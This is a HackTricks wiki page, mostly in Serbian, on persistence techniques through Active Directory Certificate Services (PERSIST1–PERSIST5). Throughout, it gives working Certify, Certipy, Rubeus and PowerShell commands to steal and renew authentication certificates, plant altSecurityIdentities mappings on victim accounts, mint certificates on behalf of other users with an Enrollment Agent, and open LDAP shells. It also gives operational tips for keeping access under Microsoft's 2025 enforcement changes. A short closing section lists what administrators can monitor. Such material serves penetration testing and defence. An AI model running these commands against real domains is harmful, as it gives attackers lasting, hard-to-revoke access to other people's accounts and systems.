# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Ovo je kratak sažetak poglavlja o account persistence iz odličnog istraživanja sa [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Razumevanje Active User Credential Theft with Certificates – PERSIST1

U scenariju u kojem korisnik može da zatraži sertifikat koji omogućava domain authentication, napadač ima priliku da zatraži i ukrade ovaj sertifikat kako bi zadržao persistence na mreži. Podrazumevano, `User` template u Active Directory dozvoljava takve zahteve, iako je ponekad onemogućen.

Korišćenjem [Certify](https://github.com/GhostPack/Certify) ili [Certipy](https://github.com/ly4k/Certipy), možete da potražite omogućene template-ove koji dozvoljavaju client authentication, a zatim da zatražite jedan:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Moć sertifikata leži u njegovoj sposobnosti da se autentifikuje kao korisnik kojem pripada, bez obzira na promene lozinke, sve dok sertifikat ostaje važeći.

Možete konvertovati PEM u PFX i koristiti ga za dobijanje TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Napomena: U kombinaciji sa drugim tehnikama (vidi THEFT sekcije), auth zasnovan na certificate omogućava persistent access bez dodirivanja LSASS i čak iz non-elevated konteksta.

## Dobijanje Machine Persistence uz Certificates - PERSIST2

Ako napadač ima elevated privileges na hostu, može da enroll-uje machine account kompromitovanog sistema za certificate koristeći podrazumevani `Machine` template. Autentifikacija kao machine omogućava S4U2Self za lokalne services i može da obezbedi trajnu host persistence:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Produženje Persistence kroz obnavljanje sertifikata - PERSIST3

Zloupotreba perioda važenja i obnove šablona sertifikata omogućava napadaču da održi dugoročan pristup. Ako posedujete prethodno izdat sertifikat i njegov privatni ključ, možete ga obnoviti pre isteka kako biste dobili svež, dugovečan credential bez ostavljanja dodatnih request artifacts povezanih sa originalnim principalom.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Operational tip: Pratite lifetime-ove na attacker-held PFX fajlovima i obnovite ih rano. Obnova takođe može da dovede do toga da ažurirani certificates uključe modern SID mapping extension, čime ostaju upotrebljivi pod strožim DC mapping pravilima (vidi sledeći section).

## Planting Explicit Certificate Mappings (altSecurityIdentities) – PERSIST4

If you can write to a target account’s `altSecurityIdentities` attribute, you can explicitly map an attacker-controlled certificate to that account. This persists across password changes and, when using strong mapping formats, remains functional under modern DC enforcement.

High-level flow:

1. Obtain or issue a client-auth certificate you control (e.g., enroll `User` template as yourself).
2. Extract a strong identifier from the cert (Issuer+Serial, SKI, or SHA1-PublicKey).
3. Add an explicit mapping on the victim principal’s `altSecurityIdentities` using that identifier.
4. Authenticate with your certificate; the DC maps it to the victim via the explicit mapping.

Example (PowerShell) using a strong Issuer+Serial mapping:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Zatim se autentifikuj sa svojim PFX. Certipy će direktno dobiti TGT:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Izgradnja jakih `altSecurityIdentities` mappinga

U praksi, **Issuer+Serial** i **SKI** mappingi su najlakši jaki formati za izgradnju iz sertifikata kojim napadač raspolaže. To je važno nakon **11. februara 2025.**, kada DCs podrazumevano prelaze na **Full Enforcement** i slabi mappingi prestaju da budu pouzdani.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Napomene
- Koristi samo jake tipove mapiranja: `X509IssuerSerialNumber`, `X509SKI`, ili `X509SHA1PublicKey`. Slabi formati (Subject/Issuer, samo Subject, RFC822 email) su zastareli i mogu biti blokirani od strane DC politike.
- Mapiranje radi i na **user** i na **computer** objektima, tako da je write access na `altSecurityIdentities` naloga računara dovoljan da se perzistira kao ta mašina.
- Cert chain mora da se izgradi do root-a kome DC veruje. Enterprise CAs u NTAuth su tipično trusted; neka okruženja takođe trustuju public CAs.
- Schannel authentication ostaje korisna za persistence čak i kada PKINIT failuje zato što DC nema Smart Card Logon EKU ili vraća `KDC_ERR_PADATA_TYPE_NOSUPP`.

#### 2025+ `Issuer/SID` explicit mappings

Na **Windows Server 2022+** domain controller-ima zakrp­ljenim **September 9, 2025** security update-om, Microsoft je dodao još jedan strong explicit mapping format koji je privlačan za persistence jer preživljava certificate reissuance od istog CA:
```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Operativno se ovo razlikuje od starijih jakih formata:
- `Issuer+Serial` pin-uje **jedan tačan certificate**.
- `SKI` / `SHA1-PUKEY` pin-uju **jedan keypair**.
- `Issuer/SID` pin-uje **izdavački CA + ciljni SID**, tako da obnovljeni ili ponovo izdata certificate od istog CA nastavljaju da rade bez prepisivanja `altSecurityIdentities`.

Zahtevi i ograničenja
- Certificate predstavljen za logon mora zaista da sadrži cilj account SID u SID security extension.
- Ovaj format nije koristan za `ESC9` / `ESC16` style certificates koji izostavljaju SID extension; u tim slučajevima vratite se na `Issuer+Serial`, `SKI`, ili `SHA1-PUKEY`.

Za više o weak explicit mappings i attack paths, pogledajte:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

Ako dobijete validan Certificate Request Agent/Enrollment Agent certificate, možete mintovati nove logon-capable certificates u ime korisnika po volji i čuvati agent PFX offline kao persistence token. Abuse workflow:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Opoziv sertifikata agenta ili dozvola za template je potreban da bi se ova persistence uklonila.

Operational notes
- Modern `Certipy` verzije podržavaju i `-on-behalf-of` i `-renew`, tako da napadač koji poseduje Enrollment Agent PFX može da izda i kasnije obnovi leaf certificates bez ponovnog dodirivanja originalnog target account-a.
- Ako PKINIT-based TGT retrieval nije moguć, rezultujući on-behalf-of certificate je i dalje upotrebljiv za Schannel autentikaciju uz `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## Using Persisted Certificates When PKINIT Fails

Ako DC nema Smart Card Logon-capable certificate, certificate logon preko PKINIT može da zakaže sa `KDC_ERR_PADATA_TYPE_NOSUPP`. To ne uništava persistence primitive: isti PFX je često i dalje upotrebljiv za Schannel-authenticated LDAP access.
```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```
Ovo je posebno korisno nakon PERSIST4/PERSIST5 jer možete nastaviti da radite sa Linux/macOS i da ulančavate druge directory persistence akcije, kao što su ubacivanje [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) ili uređivanje writable delegation atributa.

## 2025 Strong Certificate Mapping Enforcement: Impact on Persistence

Microsoft KB5014754 je uveo Strong Certificate Mapping Enforcement na domain controller-ima. Od **11. februara 2025.**, DC-ovi podrazumevano koriste **Full Enforcement** za slabe/dvosmislene mappinge, a od **security update-a 9. septembra 2025.** zakrpljeni DC-ovi više ne podržavaju stari Compatibility-mode fallback. Praktične posledice:

- Sertifikati pre-2022 koji nemaju SID mapping ekstenziju mogu da zakažu pri implicit mapping-u kada su DC-ovi u Full Enforcement. Napadači mogu održati pristup tako što će ili obnoviti sertifikate kroz AD CS (da dobiju SID ekstenziju) ili postaviti strong explicit mapping u `altSecurityIdentities` (PERSIST4).
- Explicit mappings koji koriste strong formate (`Issuer+Serial`, `SKI`, `SHA1-PUKEY`, i na modernim DC-ovima `Issuer/SID`) i dalje rade. Slabi formati (Issuer/Subject, Subject-only, RFC822) mogu biti blokirani i treba ih izbegavati za persistence.
- Ako se čini da slabi mappings i dalje rade, pretpostavite da ste pogodili nezakrpljeni ili drugačije konfigurisani DC, a ne pouzdan dugoročni persistence path.
- `ESC9` / `ESC16` stil issuance path-ova koji potiskuju SID ekstenziju čine `Issuer/SID` neupotrebljivim, pa fallback strong mappings ili obnova kroz normalan template postaju praktična opcija za persistence.

Administratori treba da nadgledaju i alarmiraju na:
- Promene u `altSecurityIdentities` i izdavanje/obnavljanje Enrollment Agent i User sertifikata.
- CA issuance logove za on-behalf-of zahteve i neuobičajene obrasce obnove.

## References

- [Microsoft Support – KB5014754: Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [GhostPack/Certify Wiki – Account Persistence Techniques](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [Certipy Wiki – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [Almond Offensive Security – Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [Microsoft Community Hub – Introducing a new Issuer/SID AltSecID](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)

{{#include ../../../banners/hacktricks-training.md}}
